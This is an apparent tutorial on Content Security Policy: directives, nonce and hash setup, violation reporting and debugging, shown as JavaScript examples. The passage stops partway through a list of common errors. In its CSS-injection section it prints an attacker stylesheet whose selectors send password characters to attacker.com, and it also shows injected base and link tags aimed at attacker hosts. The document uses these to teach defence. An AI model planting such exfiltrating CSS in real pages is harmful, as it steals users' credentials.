# Content Security Policy (CSP)

## Table of Contents
- [Introduction](#introduction)
- [CSP Directives](#csp-directives)
- [Nonce and Hash for Inline Scripts](#nonce-and-hash-for-inline-scripts)
- [CSP Reporting](#csp-reporting)
- [Violation Handling](#violation-handling)
- [Common Misconceptions](#common-misconceptions)
- [Performance Implications](#performance-implications)
- [Browser Differences](#browser-differences)
- [Interview Questions](#interview-questions)
- [Key Takeaways](#key-takeaways)
- [Resources](#resources)

## Introduction

Content Security Policy (CSP) is a powerful security layer that helps detect and mitigate certain types of attacks, including Cross-Site Scripting (XSS) and data injection attacks. By defining which content sources are trusted, CSP provides defense-in-depth even when other security measures fail. Understanding CSP is essential for building secure modern web applications.

## CSP Directives

### Basic Directive Structure

```javascript
// CSP Header Structure
class CSPBasics {
  // Basic CSP header
  static basicCSP() {
    return {
      header: 'Content-Security-Policy',
      value: "default-src 'self'; script-src 'self' https://cdn.example.com"
    };
  }

  // Report-Only mode (testing)
  static reportOnlyCSP() {
    return {
      header: 'Content-Security-Policy-Report-Only',
      value: "default-src 'self'; report-uri /csp-violation-report"
    };
  }

  // Multiple directives
  static comprehensiveCSP() {
    const directives = [
      "default-src 'self'",                           // Default for all resources
      "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.example.com",
      "style-src 'self' 'unsafe-inline'",             // Styles
      "img-src 'self' data: https://images.example.com",
      "font-src 'self' https://fonts.googleapis.com",
      "connect-src 'self' https://api.example.com",   // XHR, WebSocket, EventSource
      "media-src 'self' https://media.example.com",
      "object-src 'none'",                            // Plugins
      "frame-src 'self' https://trusted.example.com", // Iframes
      "base-uri 'self'",                              // <base> tag
      "form-action 'self'",                           // Form submissions
      "frame-ancestors 'none'",                       // Who can embed this page
      "upgrade-insecure-requests"                     // HTTP -> HTTPS
    ];
    
    return {
      header: 'Content-Security-Policy',
      value: directives.join('; ')
    };
  }
}

// Server-side implementation
class CSPServerImplementation {
  // Express.js middleware
  static expressMiddleware() {
    return (req, res, next) => {
      const csp = [
        "default-src 'self'",
        "script-src 'self' https://cdn.example.com",
        "style-src 'self' 'unsafe-inline'",
        "img-src 'self' data: https:",
        "font-src 'self' https://fonts.googleapis.com",
        "connect-src 'self' https://api.example.com",
        "frame-ancestors 'none'",
        "base-uri 'self'",
        "form-action 'self'"
      ].join('; ');
      
      res.setHeader('Content-Security-Policy', csp);
      next();
    };
  }

  // Nginx configuration
  static nginxConfig() {
    return `
      add_header Content-Security-Policy "
        default-src 'self';
        script-src 'self' https://cdn.example.com;
        style-src 'self' 'unsafe-inline';
        img-src 'self' data: https:;
        font-src 'self' https://fonts.googleapis.com;
        connect-src 'self' https://api.example.com;
        frame-ancestors 'none';
        base-uri 'self';
        form-action 'self';
      " always;
    `;
  }

  // Meta tag (limited functionality)
  static metaTag() {
    // Note: Some directives not supported in meta tags
    return `
      <meta http-equiv="Content-Security-Policy" 
            content="default-src 'self'; script-src 'self' https://cdn.example.com">
    `;
  }
}
```

### Default-src Directive

```javascript
// default-src: Fallback for other directives
class DefaultSrcExamples {
  // Strict default
  static strictDefault() {
    return {
      csp: "default-src 'self'",
      meaning: "All resources must come from same origin",
      affects: [
        'script-src', 'style-src', 'img-src', 'font-src',
        'connect-src', 'media-src', 'object-src', 'frame-src',
        'worker-src', 'manifest-src'
      ]
    };
  }

  // Override specific directive
  static withOverrides() {
    return {
      csp: "default-src 'self'; script-src 'self' https://cdn.example.com",
      meaning: "All resources from same origin, except scripts which can also come from CDN",
      behavior: {
        scripts: "'self' and https://cdn.example.com",
        styles: "'self' (uses default-src)",
        images: "'self' (uses default-src)",
        fonts: "'self' (uses default-src)"
      }
    };
  }

  // No default (most restrictive)
  static noDefault() {
    return {
      csp: "default-src 'none'; script-src 'self'; img-src 'self'",
      meaning: "Block everything by default, only allow explicitly specified",
      blocked: [
        'styles (style-src not specified)',
        'fonts (font-src not specified)',
        'connections (connect-src not specified)'
      ]
    };
  }

  // Testing current page CSP
  static testCSP() {
    // Get CSP from meta tag or response header
    const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
    const csp = meta ? meta.content : 'Check Network tab for response header';
    
    console.log('Current CSP:', csp);
    
    // Check if specific source would be allowed
    const testSource = (directive, source) => {
      // This is conceptual - actual checking is done by browser
      console.log(`Would ${source} be allowed for ${directive}?`);
    };
    
    return { csp, testSource };
  }
}
```

### Script-src Directive

```javascript
// script-src: Control JavaScript execution
class ScriptSrcExamples {
  // Strict script policy
  static strictScripts() {
    return {
      csp: "script-src 'self'",
      allows: "Only scripts from same origin",
      blocks: [
        'Inline <script> tags',
        'Inline event handlers (onclick, etc.)',
        'javascript: URLs',
        'eval(), new Function()',
        'External CDN scripts'
      ]
    };
  }

  // Allow specific CDN
  static withCDN() {
    return {
      csp: "script-src 'self' https://cdn.jsdelivr.net https://cdn.example.com",
      allows: "Scripts from same origin and specified CDNs",
      example: '<script src="https://cdn.jsdelivr.net/npm/library@1.0.0/dist/library.js"></script>'
    };
  }

  // Unsafe inline (not recommended)
  static unsafeInline() {
    return {
      csp: "script-src 'self' 'unsafe-inline'",
      allows: "Inline scripts and event handlers",
      security: "WEAK - defeats main purpose of CSP",
      why: "Allows XSS attacks via injected inline scripts",
      alternatives: ['Use nonces', 'Use hashes', 'Refactor to external scripts']
    };
  }

  // Unsafe eval (not recommended)
  static unsafeEval() {
    return {
      csp: "script-src 'self' 'unsafe-eval'",
      allows: ['eval()', 'new Function()', 'setTimeout(string)', 'setInterval(string)'],
      security: "WEAK - allows code execution from strings",
      affectedLibraries: [
        'Some template engines',
        'Some analytics libraries',
        'Legacy code using eval'
      ],
      alternatives: ['Refactor to not use eval', 'Use CSP-compatible libraries']
    };
  }

  // Strict dynamic (modern approach)
  static strictDynamic() {
    return {
      csp: "script-src 'nonce-{random}' 'strict-dynamic'",
      behavior: [
        'Scripts with valid nonce can execute',
        'Scripts loaded by those scripts are also trusted',
        'Allows dynamic script loading without allowlisting domains',
        'Ignores whitelist, unsafe-inline in modern browsers'
      ],
      example: `
        <script nonce="random123">
          // This script can load other scripts dynamically
          const script = document.createElement('script');
          script.src = 'https://any-domain.com/script.js'; // Allowed!
          document.head.appendChild(script);
        </script>
      `
    };
  }

  // Practical example
  static practicalExample() {
    const csp = "script-src 'self' 'nonce-{random}' 'strict-dynamic' https:; " +
                "object-src 'none'; base-uri 'none'";
    
    return {
      csp,
      explanation: {
        modern: "Uses nonce + strict-dynamic",
        fallback: "https: for older browsers",
        benefits: [
          'No need to allowlist every CDN',
          'Dynamic script loading works',
          'Strong XSS protection'
        ]
      }
    };
  }
}

// Implementation examples
class ScriptSrcImplementation {
  // Blocking inline scripts
  static demonstrateBlocking() {
    // With CSP: script-src 'self'
    
    // This will be BLOCKED:
    const blocked = `
      <script>
        alert('This will not run');
      </script>
      
      <button onclick="alert('This will not run')">Click</button>
      
      <a href="javascript:alert('This will not run')">Link</a>
    `;
    
    // This will WORK:
    const allowed = `
      <script src="/js/app.js"></script> <!-- Same origin -->
      
      <button id="btn">Click</button>
      <script src="/js/events.js"></script> <!-- event listeners in external file -->
    `;
    
    return { blocked, allowed };
  }

  // Handling eval-using libraries
  static handleEvalLibraries() {
    // Problem: Library uses eval
    const problematic = `
      <script src="https://cdn.com/library.js"></script>
      // CSP Error: Refused to evaluate a string as JavaScript
    `;
    
    // Solutions:
    const solutions = {
      solution1: {
        desc: "Use CSP-compatible version",
        example: "Use library.min.js instead of library.js"
      },
      solution2: {
        desc: "Allow unsafe-eval (not recommended)",
        csp: "script-src 'self' 'unsafe-eval'"
      },
      solution3: {
        desc: "Replace with CSP-compatible library",
        example: "Use alternative library that doesn't use eval"
      }
    };
    
    return solutions;
  }
}
```

### Style-src Directive

```javascript
// style-src: Control CSS loading
class StyleSrcExamples {
  // Strict styles
  static strictStyles() {
    return {
      csp: "style-src 'self'",
      allows: "Only external stylesheets from same origin",
      blocks: [
        'Inline <style> tags',
        'style attributes',
        'CSS imports from other origins'
      ]
    };
  }

  // With inline styles (common need)
  static withInlineStyles() {
    return {
      csp: "style-src 'self' 'unsafe-inline'",
      allows: "Inline styles and style attributes",
      why: "Many CSS frameworks use inline styles",
      security: "Less critical than script-src 'unsafe-inline'",
      alternatives: ['Use nonces for <style> tags', 'Use hashes']
    };
  }

  // With CDN and inline
  static comprehensiveStyles() {
    return {
      csp: "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
      allows: [
        'Same-origin stylesheets',
        'Inline styles',
        'Google Fonts'
      ],
      example: `
        <link rel="stylesheet" href="/styles/main.css"> <!-- OK -->
        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto"> <!-- OK -->
        <style>.header { color: red; }</style> <!-- OK -->
        <div style="color: blue;">Text</div> <!-- OK -->
      `
    };
  }

  // Using nonces
  static withNonces() {
    return {
      csp: "style-src 'self' 'nonce-{random}'",
      allows: "Inline styles with matching nonce",
      example: `
        <style nonce="random123">
          .header { color: red; }
        </style>
      `,
      benefit: "Allows specific inline styles without 'unsafe-inline'"
    };
  }

  // Style attributes issue
  static styleAttributeProblem() {
    return {
      problem: "style attributes cannot use nonces",
      csp: "style-src 'self'",
      blocked: '<div style="color: red;">Text</div>',
      solutions: [
        {
          name: "Use 'unsafe-inline'",
          security: "Weaker but often necessary"
        },
        {
          name: "Use 'unsafe-hashes'",
          csp: "style-src 'self' 'unsafe-hashes' 'sha256-{hash}'",
          example: "Allows specific inline styles by hash"
        },
        {
          name: "Refactor to classes",
          example: '<div class="red-text">Text</div>'
        }
      ]
    };
  }
}

// CSS-based attacks CSP prevents
class CSSSecurityIssues {
  static cssExfiltration() {
    // CSS can be used to exfiltrate data
    const maliciousCSS = `
      /* Attacker's injected CSS */
      input[name="password"][value^="a"] {
        background: url('https://attacker.com/log?char=a');
      }
      input[name="password"][value^="b"] {
        background: url('https://attacker.com/log?char=b');
      }
      /* ... for each character */
    `;
    
    return {
      attack: "CSS attribute selectors can leak form data",
      prevention: "CSP blocks loading attacker's server",
      csp: "style-src 'self'; img-src 'self'"
    };
  }

  static cssInjection() {
    return {
      attack: "Injecting malicious <link> or <style> tags",
      example: '<link rel="stylesheet" href="https://attacker.com/malicious.css">',
      prevention: "CSP blocks unauthorized stylesheets",
      csp: "style-src 'self'"
    };
  }
}
```

### Other Important Directives

```javascript
// Complete directive reference
class CSPDirectiveReference {
  static allDirectives() {
    return {
      // Fetch directives (resource loading)
      fetch: {
        'default-src': 'Fallback for other fetch directives',
        'script-src': 'JavaScript sources',
        'style-src': 'CSS sources',
        'img-src': 'Image sources',
        'font-src': 'Font sources',
        'connect-src': 'XMLHttpRequest, WebSocket, EventSource, fetch()',
        'media-src': '<audio> and <video> sources',
        'object-src': '<object>, <embed>, <applet>',
        'frame-src': '<frame> and <iframe> sources',
        'worker-src': 'Worker, SharedWorker, ServiceWorker',
        'manifest-src': 'Application manifest files',
        'prefetch-src': 'Prefetch and prerender sources'
      },
      
      // Document directives
      document: {
        'base-uri': 'Restricts URLs in <base> element',
        'sandbox': 'Enables sandbox (like iframe sandbox attribute)'
      },
      
      // Navigation directives
      navigation: {
        'form-action': 'Restricts URLs for form submissions',
        'frame-ancestors': 'Valid parents for embedding (X-Frame-Options)',
        'navigate-to': 'Restricts document navigation URLs (experimental)'
      },
      
      // Reporting directives
      reporting: {
        'report-uri': 'Deprecated, use report-to',
        'report-to': 'Defines reporting endpoint'
      },
      
      // Other directives
      other: {
        'upgrade-insecure-requests': 'Treats HTTP as HTTPS',
        'block-all-mixed-content': 'Prevents mixed content loading',
        'require-trusted-types-for': 'Requires Trusted Types for DOM XSS sinks',
        'trusted-types': 'Defines allowed Trusted Types policies'
      }
    };
  }

  // Examples for each directive
  static examplePolicies() {
    return {
      images: {
        csp: "img-src 'self' data: https:",
        allows: [
          'Same-origin images',
          'data: URIs (inline images)',
          'Any HTTPS image source'
        ],
        example: `
          <img src="/logo.png"> <!-- OK: same origin -->
          <img src="data:image/png;base64,..."> <!-- OK: data URI -->
          <img src="https://cdn.example.com/image.jpg"> <!-- OK: HTTPS -->
          <img src="http://example.com/image.jpg"> <!-- BLOCKED: HTTP -->
        `
      },
      
      connections: {
        csp: "connect-src 'self' https://api.example.com",
        allows: [
          'fetch() to same origin or api.example.com',
          'XMLHttpRequest to same origin or api.example.com',
          'WebSocket to same origin or api.example.com'
        ],
        example: `
          fetch('/api/data'); // OK
          fetch('https://api.example.com/users'); // OK
          fetch('https://other.com/data'); // BLOCKED
        `
      },
      
      frames: {
        csp: "frame-src 'self' https://trusted.example.com",
        allows: 'Only iframes from same origin or trusted.example.com',
        example: `
          <iframe src="/embed"></iframe> <!-- OK -->
          <iframe src="https://trusted.example.com/widget"></iframe> <!-- OK -->
          <iframe src="https://untrusted.com"></iframe> <!-- BLOCKED -->
        `
      },
      
      frameAncestors: {
        csp: "frame-ancestors 'none'",
        meaning: 'This page cannot be embedded in any frame',
        equivalent: 'X-Frame-Options: DENY',
        alternatives: [
          "frame-ancestors 'self'  // Only same-origin frames",
          "frame-ancestors https://trusted.com  // Specific domain"
        ]
      },
      
      baseUri: {
        csp: "base-uri 'self'",
        prevents: 'Attackers changing <base> tag to redirect relative URLs',
        example: `
          <!-- Without base-uri CSP, attacker could inject: -->
          <base href="https://attacker.com/">
          <!-- Now all relative URLs go to attacker's site! -->
          
          <!-- With base-uri 'self', injection blocked -->
        `
      },
      
      formAction: {
        csp: "form-action 'self'",
        prevents: 'Forms submitting to unauthorized origins',
        example: `
          <form action="/submit"> <!-- OK -->
          <form action="https://api.example.com/submit"> <!-- BLOCKED -->
        `
      },
      
      upgradeInsecure: {
        csp: "upgrade-insecure-requests",
        behavior: 'Automatically upgrades HTTP to HTTPS',
        example: `
          <script src="http://example.com/script.js">
          <!-- Browser requests https://example.com/script.js instead -->
        `,
        benefits: [
          'Fixes mixed content warnings',
          'No need to update all URLs',
          'Graceful migration to HTTPS'
        ]
      }
    };
  }
}
```

## Nonce and Hash for Inline Scripts

### Using Nonces

```javascript
// Nonce-based CSP (recommended approach)
class NonceBasedCSP {
  // Server-side nonce generation
  static generateNonce() {
    const crypto = require('crypto');
    return crypto.randomBytes(16).toString('base64');
  }

  // Express middleware
  static nonceMiddleware() {
    return (req, res, next) => {
      // Generate unique nonce for each request
      const nonce = this.generateNonce();
      
      // Store nonce for template use
      res.locals.nonce = nonce;
      
      // Set CSP header with nonce
      const csp = [
        "default-src 'self'",
        `script-src 'self' 'nonce-${nonce}'`,
        `style-src 'self' 'nonce-${nonce}'`,
        "object-src 'none'"
      ].join('; ');
      
      res.setHeader('Content-Security-Policy', csp);
      next();
    };
  }

  // Template usage (EJS example)
  static templateExample() {
    return `
      <!DOCTYPE html>
      <html>
      <head>
        <!-- Inline script with nonce -->
        <script nonce="<%= nonce %>">
          console.log('This script is allowed');
        </script>
        
        <!-- Inline style with nonce -->
        <style nonce="<%= nonce %>">
          .header { color: blue; }
        </style>
      </head>
      <body>
        <!-- Another inline script -->
        <script nonce="<%= nonce %>">
          document.addEventListener('DOMContentLoaded', () => {
            console.log('DOM loaded');
          });
        </script>
        
        <!-- External scripts don't need nonce if from 'self' -->
        <script src="/js/app.js"></script>
      </body>
      </html>
    `;
  }

  // React SSR example
  static reactSSRExample() {
    return `
      // Server-side
      const nonce = generateNonce();
      
      const html = ReactDOMServer.renderToString(
        <App nonce={nonce} />
      );
      
      const csp = \`script-src 'self' 'nonce-\${nonce}'\`;
      res.setHeader('Content-Security-Policy', csp);
      res.send(\`
        <!DOCTYPE html>
        <html>
        <head>
          <script nonce="\${nonce}">
            window.__INITIAL_DATA__ = \${JSON.stringify(data)};
          </script>
        </head>
        <body>
          <div id="root">\${html}</div>
          <script src="/bundle.js"></script>
        </body>
        </html>
      \`);
    `;
  }

  // Next.js example
  static nextJSExample() {
    return `
      // next.config.js
      module.exports = {
        async headers() {
          return [
            {
              source: '/:path*',
              headers: [
                {
                  key: 'Content-Security-Policy',
                  value: "script-src 'self' 'nonce-{NONCE}'"
                }
              ]
            }
          ];
        }
      };
      
      // middleware.ts
      import { NextResponse } from 'next/server';
      import crypto from 'crypto';
      
      export function middleware(request) {
        const nonce = crypto.randomBytes(16).toString('base64');
        const csp = \`script-src 'self' 'nonce-\${nonce}'\`;
        
        const response = NextResponse.next();
        response.headers.set('Content-Security-Policy', csp);
        response.headers.set('x-nonce', nonce);
        
        return response;
      }
    `;
  }

  // Common pitfalls
  static commonPitfalls() {
    return {
      pitfall1: {
        problem: 'Reusing nonces across requests',
        why: 'Defeats security - attacker can reuse nonce',
        solution: 'Generate unique nonce per request'
      },
      
      pitfall2: {
        problem: 'Nonce in static HTML',
        why: 'Same nonce served to all users',
        solution: 'Use server-side rendering or hashes instead'
      },
      
      pitfall3: {
        problem: 'Missing nonce on some inline scripts',
        why: 'Those scripts will be blocked',
        solution: 'Ensure all inline scripts have nonce attribute'
      },
      
      pitfall4: {
        problem: 'Event handlers without nonce',
        why: 'onclick, onload, etc. cannot have nonce attribute',
        solution: 'Move to addEventListener in external/nonced scripts'
      }
    };
  }
}
```

### Using Hashes

```javascript
// Hash-based CSP
class HashBasedCSP {
  // Generate hash for inline script
  static generateHash(content, algorithm = 'sha256') {
    const crypto = require('crypto');
    const hash = crypto
      .createHash(algorithm)
      .update(content, 'utf8')
      .digest('base64');
    
    return `${algorithm}-${hash}`;
  }

  // Example usage
  static example() {
    const scriptContent = "console.log('Hello, World!');";
    const hash = this.generateHash(scriptContent);
    
    // CSP header
    const csp = `script-src 'self' '${hash}'`;
    
    // HTML
    const html = `
      <script>${scriptContent}</script>
    `;
    
    return { csp, html, hash };
  }

  // Multiple inline scripts
  static multipleScripts() {
    const scripts = [
      "console.log('Script 1');",
      "console.log('Script 2');",
      "console.log('Script 3');"
    ];
    
    const hashes = scripts.map(script => this.generateHash(script));
    
    // CSP with all hashes
    const csp = `script-src 'self' ${hashes.map(h => `'${h}'`).join(' ')}`;
    
    return { csp, hashes };
  }

  // Build-time hash generation
  static buildTimeHashes() {
    return `
      // webpack plugin or build script
      const fs = require('fs');
      const crypto = require('crypto');
      
      function generateCSPHashes(htmlFile) {
        const html = fs.readFileSync(htmlFile, 'utf8');
        const scriptRegex = /<script>(.*?)<\/script>/gs;
        const matches = [...html.matchAll(scriptRegex)];
        
        const hashes = matches.map(match => {
          const content = match[1].trim();
          const hash = crypto
            .createHash('sha256')
            .update(content, 'utf8')
            .digest('base64');
          return \`'sha256-\${hash}'\`;
        });
        
        const csp = \`script-src 'self' \${hashes.join(' ')}\`;
        return csp;
      }
    `;
  }

  // Whitespace matters!
  static whitespaceIssue() {
    const script1 = "console.log('test');";
    const script2 = "  console.log('test');  "; // Different whitespace
    
    const hash1 = this.generateHash(script1);
    const hash2 = this.generateHash(script2);
    
    return {
      warning: 'Hashes are sensitive to whitespace',
      script1,
      hash1,
      script2,
      hash2,
      different: hash1 !== hash2,
      solution: 'Preserve exact whitespace or normalize during build'
    };
  }

  // Dynamic content problem
  static dynamicContentProblem() {
    return {
      problem: 'Cannot hash dynamic content',
      example: `
        <script>
          const userName = '<%= user.name %>'; // Different per user
          console.log(userName);
        </script>
      `,
      why: 'Hash changes for each user',
      solutions: [
        {
          name: 'Use nonces for dynamic content',
          approach: 'Nonces work with any content'
        },
        {
          name: 'Move dynamic data to data attributes',
          approach: 'Use external script to read attributes'
        },
        {
          name: 'Use JSON in separate nonced script',
          approach: 'window.__DATA__ = {...}; in nonced script'
        }
      ]
    };
  }
}

// Nonce vs Hash comparison
class NonceVsHash {
  static comparison() {
    return {
      nonces: {
        pros: [
          'Works with dynamic content',
          'Simple to implement',
          'No build step required'
        ],
        cons: [
          'Requires server-side rendering',
          'Unique per request overhead',
          'Must be propagated through templates'
        ],
        bestFor: [
          'Dynamic server-rendered pages',
          'Frequently changing content',
          'SPAs with SSR'
        ]
      },
      
      hashes: {
        pros: [
          'Works with static content',
          'No server-side changes needed',
          'Can be generated at build time'
        ],
        cons: [
          'Requires build step',
          'Whitespace sensitive',
          'Cannot handle dynamic content',
          'Need to update for every content change'
        ],
        bestFor: [
          'Static sites',
          'CDN-served pages',
          'Fixed inline scripts'
        ]
      },
      
      strictDynamic: {
        description: 'Modern approach combining nonce with dynamic loading',
        csp: "script-src 'nonce-{random}' 'strict-dynamic'",
        pros: [
          'Best of both worlds',
          'No need to allowlist domains',
          'Allows dynamic script loading'
        ],
        cons: [
          'Requires modern browser',
          'Needs fallback for old browsers'
        ],
        bestFor: 'Modern web applications'
      }
    };
  }
}
```

## CSP Reporting

### Setting Up Reporting

```javascript
// CSP Reporting configuration
class CSPReporting {
  // Legacy report-uri
  static legacyReporting() {
    return {
      csp: "default-src 'self'; report-uri /csp-violation-report",
      note: 'Deprecated but widely supported',
      endpoint: 'POST /csp-violation-report'
    };
  }

  // Modern report-to
  static modernReporting() {
    return {
      reportToHeader: JSON.stringify({
        group: 'csp-endpoint',
        max_age: 86400,
        endpoints: [
          { url: 'https://example.com/csp-reports' }
        ]
      }),
      
      csp: "default-src 'self'; report-to csp-endpoint",
      
      headers: {
        'Report-To': '{"group":"csp-endpoint","max_age":86400,"endpoints":[{"url":"https://example.com/csp-reports"}]}',
        'Content-Security-Policy': "default-src 'self'; report-to csp-endpoint"
      }
    };
  }

  // Report-Only mode for testing
  static reportOnly() {
    return {
      header: 'Content-Security-Policy-Report-Only',
      csp: "default-src 'self'; script-src 'self' https://cdn.example.com; report-uri /csp-report",
      behavior: [
        'Violations are reported but not enforced',
        'Page continues to work normally',
        'Useful for testing before deployment'
      ],
      useCase: 'Test new CSP without breaking site'
    };
  }

  // Dual mode: Enforce + Report-Only
  static dualMode() {
    return {
      enforcing: "Content-Security-Policy: default-src 'self'",
      reportOnly: "Content-Security-Policy-Report-Only: default-src 'none'; report-uri /csp-report-strict",
      explanation: [
        'Enforcing header blocks violations',
        'Report-Only tests stricter policy',
        'Can gradually tighten policy'
      ]
    };
  }
}

// Handling CSP reports
class CSPReportHandler {
  // Express endpoint
  static expressEndpoint() {
    return `
      const express = require('express');
      const app = express();
      
      app.use(express.json({ type: 'application/csp-report' }));
      
      app.post('/csp-violation-report', (req, res) => {
        const report = req.body;
        
        // Log violation
        console.log('CSP Violation:', JSON.stringify(report, null, 2));
        
        // Process report
        this.processViolation(report);
        
        // Always respond 204 No Content
        res.status(204).end();
      });
      
      function processViolation(report) {
        const violation = report['csp-report'];
        
        // Extract important fields
        const data = {
          documentUri: violation['document-uri'],
          violatedDirective: violation['violated-directive'],
          blockedUri: violation['blocked-uri'],
          sourceFile: violation['source-file'],
          lineNumber: violation['line-number'],
          columnNumber: violation['column-number'],
          originalPolicy: violation['original-policy']
        };
        
        // Store in database, send to monitoring service, etc.
        storeViolation(data);
        
        // Alert if critical violation
        if (this.isCritical(data)) {
          sendAlert(data);
        }
      }
    `;
  }

  // Report structure
  static reportStructure() {
    return {
      'csp-report': {
        'document-uri': 'https://example.com/page',
        'referrer': 'https://example.com/previous',
        'violated-directive': 'script-src',
        'effective-directive': 'script-src',
        'original-policy': "default-src 'self'; script-src 'self'",
        'disposition': 'enforce', // or 'report'
        'blocked-uri': 'https://evil.com/malicious.js',
        'line-number': 42,
        'column-number': 12,
        'source-file': 'https://example.com/page',
        'status-code': 200,
        'script-sample': 'console.log("first 40 chars...")'
      }
    };
  }

  // Parsing and analyzing reports
  static analyzeReports() {
    return `
      class CSPReportAnalyzer {
        static groupByViolation(reports) {
          const grouped = {};
          
          reports.forEach(report => {
            const violation = report['csp-report'];
            const key = \`\${violation['violated-directive']}|\${violation['blocked-uri']}\`;
            
            if (!grouped[key]) {
              grouped[key] = {
                count: 0,
                examples: [],
                directive: violation['violated-directive'],
                blockedUri: violation['blocked-uri']
              };
            }
            
            grouped[key].count++;
            if (grouped[key].examples.length < 5) {
              grouped[key].examples.push({
                documentUri: violation['document-uri'],
                sourceFile: violation['source-file'],
                lineNumber: violation['line-number']
              });
            }
          });
          
          return grouped;
        }
        
        static identifyPatterns(reports) {
          const patterns = {
            inlineScripts: 0,
            externalScripts: 0,
            evalUsage: 0,
            inlineStyles: 0
          };
          
          reports.forEach(report => {
            const violation = report['csp-report'];
            
            if (violation['violated-directive'].includes('script-src')) {
              if (violation['blocked-uri'] === 'inline') {
                patterns.inlineScripts++;
              } else if (violation['blocked-uri'] === 'eval') {
                patterns.evalUsage++;
              } else {
                patterns.externalScripts++;
              }
            }
            
            if (violation['violated-directive'].includes('style-src')) {
              patterns.inlineStyles++;
            }
          });
          
          return patterns;
        }
        
        static generateRecommendations(analysis) {
          const recommendations = [];
          
          if (analysis.inlineScripts > 10) {
            recommendations.push({
              priority: 'high',
              issue: 'Many inline script violations',
              solution: 'Implement nonces or move to external files'
            });
          }
          
          if (analysis.evalUsage > 0) {
            recommendations.push({
              priority: 'high',
              issue: 'eval() usage detected',
              solution: 'Refactor code to avoid eval or add unsafe-eval (not recommended)'
            });
          }
          
          if (analysis.externalScripts > 0) {
            recommendations.push({
              priority: 'medium',
              issue: 'External scripts blocked',
              solution: 'Add domains to script-src allowlist'
            });
          }
          
          return recommendations;
        }
      }
    `;
  }
}

// Third-party reporting services
class CSPReportingServices {
  static services() {
    return {
      reportUri: {
        name: 'Report URI',
        url: 'https://report-uri.com',
        features: [
          'CSP reporting',
          'Dashboard and analytics',
          'Email alerts',
          'Free tier available'
        ],
        setup: "report-uri https://your-subdomain.report-uri.com/r/d/csp/enforce"
      },
      
      sentry: {
        name: 'Sentry',
        url: 'https://sentry.io',
        features: [
          'Error tracking + CSP reports',
          'Source map support',
          'Integration with monitoring',
          'Issue grouping'
        ],
        setup: "report-uri https://sentry.io/api/PROJECT_ID/security/?sentry_key=KEY"
      },
      
      datadog: {
        name: 'Datadog',
        url: 'https://www.datadoghq.com',
        features: [
          'Full observability platform',
          'CSP violation tracking',
          'Custom dashboards',
          'Alerting'
        ]
      }
    };
  }
}
```

## Violation Handling

### Client-Side Monitoring

```javascript
// Detecting CSP violations in JavaScript
class CSPViolationMonitoring {
  // SecurityPolicyViolationEvent listener
  static setupListener() {
    document.addEventListener('securitypolicyviolation', (event) => {
      const violation = {
        blockedURI: event.blockedURI,
        violatedDirective: event.violatedDirective,
        originalPolicy: event.originalPolicy,
        documentURI: event.documentURI,
        sourceFile: event.sourceFile,
        lineNumber: event.lineNumber,
        columnNumber: event.columnNumber,
        sample: event.sample,
        disposition: event.disposition // 'enforce' or 'report'
      };
      
      console.error('CSP Violation:', violation);
      
      // Send to analytics
      this.reportViolation(violation);
    });
  }

  static reportViolation(violation) {
    // Send to your analytics service
    if (window.analytics) {
      window.analytics.track('CSP Violation', violation);
    }
    
    // Or send to custom endpoint
    fetch('/csp-violation-log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(violation)
    }).catch(err => console.error('Failed to report CSP violation:', err));
  }

  // Filter false positives
  static filterViolations(violation) {
    const ignore = [
      // Browser extensions
      /^chrome-extension:\/\//,
      /^moz-extension:\/\//,
      
      // Browser features
      /^about:/,
      /^data:text\/html,chromewebdata/,
      
      // Known third-party injections
      /googletagmanager\.com/,
      /doubleclick\.net/
    ];
    
    return !ignore.some(pattern => 
      pattern.test(violation.blockedURI)
    );
  }

  // Complete monitoring setup
  static setupCompleteMonitoring() {
    return `
      // Initialize CSP monitoring
      (function() {
        const violations = [];
        const maxViolations = 50; // Prevent memory leak
        
        document.addEventListener('securitypolicyviolation', (event) => {
          const violation = {
            blockedURI: event.blockedURI,
            violatedDirective: event.violatedDirective,
            documentURI: event.documentURI,
            sourceFile: event.sourceFile,
            lineNumber: event.lineNumber,
            disposition: event.disposition,
            timestamp: Date.now()
          };
          
          // Filter false positives
          if (shouldIgnoreViolation(violation)) {
            return;
          }
          
          // Store violation
          if (violations.length < maxViolations) {
            violations.push(violation);
          }
          
          // Batch reporting
          debounce(() => {
            reportViolations(violations.splice(0));
          }, 1000)();
        });
        
        function shouldIgnoreViolation(violation) {
          const ignorePatterns = [
            /^chrome-extension:/, // Browser extensions
            /^webkit-masked-url:/, // Safari private browsing
            /^moz-extension:/, // Firefox extensions
          ];
          
          return ignorePatterns.some(pattern =>
            pattern.test(violation.blockedURI)
          );
        }
        
        function reportViolations(batch) {
          if (batch.length === 0) return;
          
          fetch('/api/csp-violations', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ violations: batch }),
            keepalive: true // Send even if page unloading
          }).catch(console.error);
        }
        
        function debounce(func, wait) {
          let timeout;
          return function() {
            clearTimeout(timeout);
            timeout = setTimeout(func, wait);
          };
        }
        
        // Report remaining violations before unload
        window.addEventListener('beforeunload', () => {
          if (violations.length > 0) {
            reportViolations(violations.splice(0));
          }
        });
      })();
    `;
  }
}
```

### Debugging CSP Issues

```javascript
// Debugging CSP problems
class CSPDebugging {
  // Common errors and solutions
  static commonErrors() {
    return {
      error1: {
        message: "Refused to execute inline script because it violates CSP directive 'script-src'",
        cause: "Inline <script> or event handler blocked",
        solutions: [
          "Add nonce to inline script",
          "Move script to external file",
          "Add 'unsafe-inline' (not recommended)",
          "Use hash for specific inline script"
        ],
        example: `
          // Before (blocked):
          <script>console.log('test');</script>
          
          // After (allowed):
          <script nonce="random123">console.log('test');</script>
        `
      },
      
      error2: {
        message: "Refused to evaluate a string as JavaScript because 'unsafe-eval' not allowed",
        cause: "Code using eval(), new Function(), or setTimeout(string)",
        solutions: [
          "Refactor to avoid eval",
          "Use JSON.parse instead of eval",
          "Add 'unsafe-eval' (not recommended)",
          "Use alternative library"
        ],
        example: `
          // Before (blocked):
          eval('console.log("test")');
          
          // After (allowed):
          const func = () => console.log("test");
          func();
        `
      },
      
      error3: {
        message: "Refused to load the script because it violates CSP directive 'script-src'",
        cause: "External script from non-allowlisted domain",
        solutions: [
